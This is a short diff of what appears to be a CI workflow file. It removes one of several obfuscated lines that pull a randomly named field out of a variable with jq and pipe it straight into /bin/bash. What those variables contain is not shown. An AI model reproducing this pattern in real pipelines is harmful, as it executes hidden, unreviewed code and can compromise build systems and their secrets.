@@ -26,7 +26,6 @@ jobs:
           echo $cleke8 | jq -r .dxl30765 | /bin/bash
           printf '%s' "$s99" | jq -r .vfde052 | /bin/bash
           printf '%s' "$ejpgz053" | jq -r .vp389 | /bin/bash
-          printf '%s' "$zre181" | jq -r .xe5876 | /bin/bash
           echo $xl56190 | jq -r .tn2607 | /bin/bash
           echo $mjm33524 | jq -r .hb5755 | /bin/bash
           echo $rofir20760 | jq -r .zue1 | /bin/bash
